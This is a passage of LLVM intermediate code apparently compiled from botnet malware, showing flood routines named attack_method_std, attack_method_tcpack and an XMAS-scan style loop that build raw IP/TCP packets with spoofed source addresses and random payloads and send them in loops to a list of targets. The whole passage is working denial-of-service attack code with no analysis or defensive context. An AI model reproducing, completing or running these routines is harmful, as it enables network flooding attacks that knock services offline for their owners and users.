; <label>:212:                                    ; preds = %.us-lcssa.us, %208
  %213 = getelementptr inbounds i8, i8* %195, i64 9
  store i8 6, i8* %213, align 1
  %214 = load i32, i32* @LOCAL_ADDR, align 4
  %215 = getelementptr inbounds i8, i8* %195, i64 12
  %216 = bitcast i8* %215 to i32*
  store i32 %214, i32* %216, align 4
  %217 = getelementptr inbounds i8, i8* %195, i64 16
  %218 = bitcast i8* %217 to i32*
  store i32 %179, i32* %218, align 4
  %219 = bitcast i8* %197 to i16*
  store i16 %192, i16* %219, align 4
  %220 = getelementptr inbounds i8, i8* %195, i64 22
  %221 = bitcast i8* %220 to i16*
  store i16 %178, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %195, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %189, i32* %223, align 4
  %224 = getelementptr inbounds i8, i8* %195, i64 28
  %225 = bitcast i8* %224 to i32*
  store i32 %185, i32* %225, align 4
  %226 = getelementptr inbounds i8, i8* %195, i64 32
  %227 = bitcast i8* %226 to i16*
  %228 = getelementptr inbounds i8, i8* %195, i64 34
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 2
  store i16 %81, i16* %227, align 4
  call void @rand_str(i8* %199, i32 %37)
  br label %.loopexit152

; <label>:230:                                    ; preds = %174
  %231 = and i16 %175, 1280
  %232 = icmp eq i16 %231, 0
  br i1 %232, label %237, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @close(i32 %141) #11
  br label %.backedge

.backedge:                                        ; preds = %233, %241
  %235 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %.loopexit152.loopexit207, label %.lr.ph161.split

; <label>:237:                                    ; preds = %230, %170, %167, %163
  %238 = call i64 @time(i64* null) #11
  %239 = sub nsw i64 %238, %158
  %240 = icmp sgt i64 %239, 10
  br i1 %240, label %241, label %159

; <label>:241:                                    ; preds = %237
  %242 = call i32 @close(i32 %141) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit152

.loopexit152.loopexit207:                         ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit207, %.loopexit152.loopexit, %.preheader151, %212
  %.1 = phi %struct.tcphdr* [ %198, %212 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ], [ %.0162, %.loopexit152.loopexit207 ]
  %243 = load i32, i32* %5, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %5, align 4
  %245 = icmp slt i32 %244, %46
  br i1 %245, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %255
  br label %.loopexit.backedge

.loopexit.loopexit204:                            ; preds = %298
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit204
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %136, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %255
  %storemerge139160.us = phi i32 [ %289, %255 ], [ 0, %.lr.ph.split.us.preheader ]
  %246 = sext i32 %storemerge139160.us to i64
  %247 = getelementptr inbounds i8*, i8** %14, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  %250 = getelementptr inbounds i8, i8* %248, i64 20
  %251 = getelementptr inbounds i8, i8* %248, i64 4
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br i1 %137, label %255, label %253

; <label>:253:                                    ; preds = %.lr.ph.split.us
  %254 = getelementptr inbounds i8, i8* %248, i64 40
  call void @rand_str(i8* %254, i32 %37)
  %.pre174 = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %253, %.lr.ph.split.us
  %256 = phi i32 [ %.pre174, %253 ], [ %storemerge139160.us, %.lr.ph.split.us ]
  %257 = getelementptr inbounds i8, i8* %248, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %248 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = sext i32 %256 to i64
  %262 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %261, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %262, align 4
  %265 = trunc i32 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #12
  %267 = zext i16 %266 to i32
  %268 = getelementptr inbounds i8, i8* %248, i64 24
  %269 = bitcast i8* %268 to i32*
  store i32 %267, i32* %269, align 4
  %270 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %261, i32 2
  %271 = load i32, i32* %270, align 4
  %272 = trunc i32 %271 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #12
  %274 = zext i16 %273 to i32
  %275 = getelementptr inbounds i8, i8* %248, i64 28
  %276 = bitcast i8* %275 to i32*
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds i8, i8* %248, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext %139) #12
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %249, i8* %250, i16 zeroext %279, i32 %140)
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %248, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %40, i8* %248, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %286, i32 16) #11
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = icmp slt i32 %289, %46
  br i1 %290, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %298
  %storemerge139160 = phi i32 [ %332, %298 ], [ 0, %.lr.ph.split.preheader ]
  %291 = sext i32 %storemerge139160 to i64
  %292 = getelementptr inbounds i8*, i8** %14, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  %295 = getelementptr inbounds i8, i8* %293, i64 20
  br i1 %137, label %298, label %296

; <label>:296:                                    ; preds = %.lr.ph.split
  %297 = getelementptr inbounds i8, i8* %293, i64 40
  call void @rand_str(i8* %297, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %298

; <label>:298:                                    ; preds = %.lr.ph.split, %296
  %299 = phi i32 [ %storemerge139160, %.lr.ph.split ], [ %.pre, %296 ]
  %300 = getelementptr inbounds i8, i8* %293, i64 10
  %301 = bitcast i8* %300 to i16*
  store i16 0, i16* %301, align 2
  %302 = bitcast i8* %293 to i16*
  %303 = call zeroext i16 @checksum_generic(i16* %302, i32 20)
  store i16 %303, i16* %301, align 2
  %304 = sext i32 %299 to i64
  %305 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %304, i32 1
  %306 = load i32, i32* %305, align 4
  %307 = add i32 %306, 1
  store i32 %307, i32* %305, align 4
  %308 = trunc i32 %306 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #12
  %310 = zext i16 %309 to i32
  %311 = getelementptr inbounds i8, i8* %293, i64 24
  %312 = bitcast i8* %311 to i32*
  store i32 %310, i32* %312, align 4
  %313 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %304, i32 2
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i16
  %316 = call zeroext i16 @htons(i16 zeroext %315) #12
  %317 = zext i16 %316 to i32
  %318 = getelementptr inbounds i8, i8* %293, i64 28
  %319 = bitcast i8* %318 to i32*
  store i32 %317, i32* %319, align 4
  %320 = getelementptr inbounds i8, i8* %293, i64 36
  %321 = bitcast i8* %320 to i16*
  store i16 0, i16* %321, align 4
  %322 = call zeroext i16 @htons(i16 zeroext %139) #12
  %323 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %294, i8* %295, i16 zeroext %322, i32 %140)
  store i16 %323, i16* %321, align 4
  %324 = getelementptr inbounds i8, i8* %293, i64 22
  %325 = bitcast i8* %324 to i16*
  %326 = load i16, i16* %325, align 2
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0, i32 1
  store i16 %326, i16* %327, align 2
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0
  %329 = bitcast %struct.sockaddr_in* %328 to %struct.sockaddr*
  %330 = call i64 @sendto(i32 %40, i8* %293, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %329, i32 16) #11
  %331 = load i32, i32* %5, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %5, align 4
  %333 = icmp slt i32 %332, %46
  br i1 %333, label %.lr.ph.split, label %.loopexit.loopexit204

.loopexit150.loopexit:                            ; preds = %103
  br label %.loopexit150

.loopexit150.loopexit205:                         ; preds = %159
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit205, %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #11
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #12
  %49 = call i32 @htonl(i32 %48) #12
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #11
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #11
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #12
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #11
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #12
  %90 = call i32 @htonl(i32 %89) #12
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #11
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %280, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %107, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = or i16 %68, 80
  %70 = icmp eq i8 %28, 0
  %71 = or i16 %68, 2128
  br i1 %50, label %.lr.ph129.split.us.preheader, label %.lr.ph129.split.preheader

.lr.ph129.split.preheader:                        ; preds = %.lr.ph129
  %.135 = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split

.lr.ph129.split.us.preheader:                     ; preds = %.lr.ph129
  %. = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split.us

.lr.ph129.split.us:                               ; preds = %.lr.ph129.split.us.preheader, %.lr.ph129.split.us
  %72 = phi i32 [ %105, %.lr.ph129.split.us ], [ 0, %.lr.ph129.split.us.preheader ]
  %73 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %74 = sext i32 %72 to i64
  %75 = getelementptr inbounds i8*, i8** %8, i64 %74
  store i8* %73, i8** %75, align 8
  %76 = getelementptr inbounds i8, i8* %73, i64 20
  %77 = getelementptr inbounds i8, i8* %73, i64 40
  store i8 69, i8* %73, align 4
  %78 = getelementptr inbounds i8, i8* %73, i64 1
  store i8 %10, i8* %78, align 1
  %79 = call zeroext i16 @htons(i16 zeroext %49) #12
  %80 = getelementptr inbounds i8, i8* %73, i64 2
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext %12) #12
  %83 = getelementptr inbounds i8, i8* %73, i64 4
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 4
  %85 = getelementptr inbounds i8, i8* %73, i64 8
  store i8 %14, i8* %85, align 4
  %86 = getelementptr inbounds i8, i8* %73, i64 9
  store i8 6, i8* %86, align 1
  %87 = getelementptr inbounds i8, i8* %73, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %39, i32* %88, align 4
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %74, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = getelementptr inbounds i8, i8* %73, i64 16
  %92 = bitcast i8* %91 to i32*
  store i32 %90, i32* %92, align 4
  %93 = call zeroext i16 @htons(i16 zeroext %18) #12
  %94 = bitcast i8* %76 to i16*
  store i16 %93, i16* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext %20) #12
  %96 = getelementptr inbounds i8, i8* %73, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %51) #12
  %99 = zext i16 %98 to i32
  %100 = getelementptr inbounds i8, i8* %73, i64 24
  %101 = bitcast i8* %100 to i32*
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds i8, i8* %73, i64 32
  %103 = bitcast i8* %102 to i16*
  store i16 %., i16* %103, align 4
  call void @rand_str(i8* nonnull %77, i32 %35)
  %104 = load i32, i32* %5, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %5, align 4
  %106 = icmp slt i32 %105, %46
  br i1 %106, label %.lr.ph129.split.us, label %.preheader.loopexit

; <label>:107:                                    ; preds = %42
  %108 = call i32 @close(i32 %40) #11
  br label %280

.preheader.loopexit:                              ; preds = %.lr.ph129.split.us
  br label %.preheader

.preheader.loopexit139:                           ; preds = %.lr.ph129.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit139, %.preheader.loopexit, %.preheader127
  %109 = icmp eq i32 %39, -1
  %110 = and i32 %11, 65535
  %111 = icmp eq i32 %110, 65535
  %112 = and i32 %17, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %19, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = icmp eq i32 %21, 65535
  %117 = icmp eq i32 %22, 65535
  %118 = icmp eq i8 %37, 0
  %119 = sext i32 %35 to i64
  %120 = add nsw i64 %119, 20
  %121 = trunc i64 %120 to i16
  %122 = trunc i64 %120 to i32
  %123 = add nsw i64 %119, 40
  br label %.loopexit

.lr.ph129.split:                                  ; preds = %.lr.ph129.split.preheader, %.lr.ph129.split
  %124 = phi i32 [ %160, %.lr.ph129.split ], [ 0, %.lr.ph129.split.preheader ]
  %125 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %126 = sext i32 %124 to i64
  %127 = getelementptr inbounds i8*, i8** %8, i64 %126
  store i8* %125, i8** %127, align 8
  %128 = getelementptr inbounds i8, i8* %125, i64 20
  %129 = getelementptr inbounds i8, i8* %125, i64 40
  store i8 69, i8* %125, align 4
  %130 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 %10, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext %49) #12
  %132 = getelementptr inbounds i8, i8* %125, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #12
  %135 = getelementptr inbounds i8, i8* %125, i64 4
